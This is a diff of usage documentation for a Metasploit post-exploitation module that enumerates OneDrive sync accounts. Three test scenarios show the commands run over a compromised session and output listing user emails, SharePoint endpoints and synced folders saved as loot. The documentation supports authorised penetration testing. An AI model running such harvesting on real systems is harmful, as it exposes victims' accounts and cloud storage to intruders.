@@ -28,38 +28,118 @@ The session to run the module on.
 
 ## Scenarios
 
+### Windows 10 x64 v2004 With OneDrive Installed But No Accounts
 ```
-msf6 post(windows/gather/enum_onedrive) > rerun
-[*] Reloading module...
-[*] Looking for OneDrive sync information for S-1-5-21-1058076759-3907379039-658025484-1001
-[+] OneDrive sync information for S-1-5-21-1058076759-3907379039-658025484-1001
+msf6 exploit(multi/handler) > use post/windows/gather/enum_onedrive 
+msf6 post(windows/gather/enum_onedrive) > show options
 
+Module options (post/windows/gather/enum_onedrive):
 
-Business1
-=========
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  1                yes       The session to run this module on.
 
-  Business: 1
-  ServiceEndpointUri: https://demo1-my.sharepoint.com/personal/stuart_mwrdemo_com/_api
-  SPOResourceId: https://demo1-my.sharepoint.com/
-  UserEmail: stuart@mwrdemo.com
-  UserFolder: C:\Users\Stuart\OneDrive - MWRDemo
-  UserName: Stuart
+msf6 post(windows/gather/enum_onedrive) > set SESSION 2 
+SESSION => 2
+msf6 post(windows/gather/enum_onedrive) > run
 
-  | LibraryType: teamsite
-  | LastModifiedTime: 2021-01-07T20:00:54
-  | MountPoint: C:\Users\Stuart\Demo\Training
-  | UrlNamespace: https://demo1.sharepoint.com/sites/Training/Shared Documents/
+[-] Error loading USER S-1-5-21-3917347361-1576396349-327053466-1000: Profile doesn't exist or cannot be accessed
+[-] Error loading USER S-1-5-21-3917347361-1576396349-327053466-1001: Profile doesn't exist or cannot be accessed
+[*] Looking for OneDrive sync information for S-1-5-21-3917347361-1576396349-327053466-1000
+[-] (HKU\S-1-5-21-3917347361-1576396349-327053466-1000) OneDrive not installed.
+[*] Looking for OneDrive sync information for S-1-5-21-3917347361-1576396349-327053466-1001
+[-] (HKU\S-1-5-21-3917347361-1576396349-327053466-1001) OneDrive not installed.
+[*] Looking for OneDrive sync information for S-1-5-21-3917347361-1576396349-327053466-1002
+[-] (HKU\S-1-5-21-3917347361-1576396349-327053466-1002) OneDrive not installed.
 
-  | LibraryType: teamsite
-  | LastModifiedTime: 2021-01-06T21:04:01
-  | MountPoint: C:\Users\Stuart\Demo\Vault
-  | UrlNamespace: https://demo1.sharepoint.com/sites/Vault/Private/
-
-  | LibraryType: mysite
-  | LastModifiedTime: 2021-01-07T20:00:54
-  | MountPoint: C:\Users\Stuart\OneDrive - MWRDemo
-  | UrlNamespace: https://demo1-my.sharepoint.com/personal/stuart_mwrdemo_com/Documents/
-
-[+] OneDrive sync information saved to /usr/home/s/stuart/.msf4/loot/20210107203200_default_192.0.2.180_onedrive.syncinf_658363.txt in CSV format.
 [*] Post module execution completed
+msf6 post(windows/gather/enum_onedrive) >
+```
+
+### Windows 10 x64 v2004 With OneDrive Installed and One Business and One Personal Account
+
+```
+msf6 exploit(multi/handler) > use post/windows/gather/enum_onedrive 
+msf6 post(windows/gather/enum_onedrive) > set SESSION 3 
+SESSION => 3
+msf6 post(windows/gather/enum_onedrive) > run
+
+[-] Error loading USER S-1-5-21-3917347361-1576396349-327053466-1000: Profile doesn't exist or cannot be accessed
+[-] Error loading USER S-1-5-21-3917347361-1576396349-327053466-1001: Profile doesn't exist or cannot be accessed
+[*] Looking for OneDrive sync information for S-1-5-21-3917347361-1576396349-327053466-1000
+[-] (HKU\S-1-5-21-3917347361-1576396349-327053466-1000) No OneDrive accounts found.
+[*] Looking for OneDrive sync information for S-1-5-21-3917347361-1576396349-327053466-1001
+[-] (HKU\S-1-5-21-3917347361-1576396349-327053466-1001) No OneDrive accounts found.
+[*] Looking for OneDrive sync information for S-1-5-21-3917347361-1576396349-327053466-1002
+[+] OneDrive sync information for S-1-5-21-3917347361-1576396349-327053466-1002
+
+  Business1
+  =========
+
+    Business: 1
+    ServiceEndpointUri: https://testing33sdf-my.sharepoint.com/personal/test_testing33sdf_onmicrosoft_com/_api
+    SPOResourceId: https://testing33sdf-my.sharepoint.com/
+    UserEmail: test@testing33sdf.onmicrosoft.com
+    UserFolder: C:\Users\normal\OneDrive - Foobar Notes
+    UserName: test test
+
+    | LibraryType: mysite
+    | LastModifiedTime: 2021-01-27T22:11:09
+    | MountPoint: C:\Users\normal\OneDrive - Foobar Notes
+    | UrlNamespace: https://testing33sdf-my.sharepoint.com/personal/test_testing33sdf_onmicrosoft_com/Documents/
+
+  Personal
+  ========
+
+    UserEmail: giziw21000@jentrix.com
+    UserFolder: C:\Users\normal\OneDrive
+
+    | LibraryType: personal
+    | LastModifiedTime: 2021-01-27T21:16:04
+    | MountPoint: C:\Users\normal\OneDrive
+    | UrlNamespace: https://d.docs.live.net
+
+[+] OneDrive sync information saved to /home/gwillcox/.msf4/loot/20210129095922_default_172.18.30.231_onedrive.syncinf_606475.txt in CSV format.
+[*] Post module execution completed
+msf6 post(windows/gather/enum_onedrive) > 
+```
+
+### Windows 10 x64 v2004 With OneDrive Installed and One Business and One Personal Account, But One Account Is Orphaned
+```
+msf6 exploit(multi/handler) > use post/windows/gather/enum_onedrive 
+msf6 post(windows/gather/enum_onedrive) > set SESSION 3 
+SESSION => 3
+msf6 post(windows/gather/enum_onedrive) > run
+
+[-] Error loading USER S-1-5-21-3917347361-1576396349-327053466-1000: Profile doesn't exist or cannot be accessed
+[-] Error loading USER S-1-5-21-3917347361-1576396349-327053466-1001: Profile doesn't exist or cannot be accessed
+[*] Looking for OneDrive sync information for S-1-5-21-3917347361-1576396349-327053466-1000
+[-] (HKU\S-1-5-21-3917347361-1576396349-327053466-1000) No OneDrive accounts found.
+[*] Looking for OneDrive sync information for S-1-5-21-3917347361-1576396349-327053466-1001
+[-] (HKU\S-1-5-21-3917347361-1576396349-327053466-1001) No OneDrive accounts found.
+[*] Looking for OneDrive sync information for S-1-5-21-3917347361-1576396349-327053466-1002
+[+] OneDrive sync information for S-1-5-21-3917347361-1576396349-327053466-1002
+
+  Personal
+  ========
+
+    UserEmail: giziw21000@jentrix.com
+    UserFolder: C:\Users\normal\OneDrive
+
+    | LibraryType: personal
+    | LastModifiedTime: 2021-01-27T21:16:04
+    | MountPoint: C:\Users\normal\OneDrive
+    | UrlNamespace: https://d.docs.live.net
+
+  ORPHANED
+  ========
+
+  LibraryType: mysite
+  LastModifiedTime: 2021-01-27T22:11:09
+  MountPoint: C:\Users\normal\OneDrive - Foobar Notes
+  UrlNamespace: https://testing33sdf-my.sharepoint.com/personal/test_testing33sdf_onmicrosoft_com/Documents/
+
+[+] OneDrive sync information saved to /home/gwillcox/.msf4/loot/20210129101238_default_172.18.30.231_onedrive.syncinf_127262.txt in CSV format.
+[*] Post module execution completed
+msf6 post(windows/gather/enum_onedrive) > 
 ```
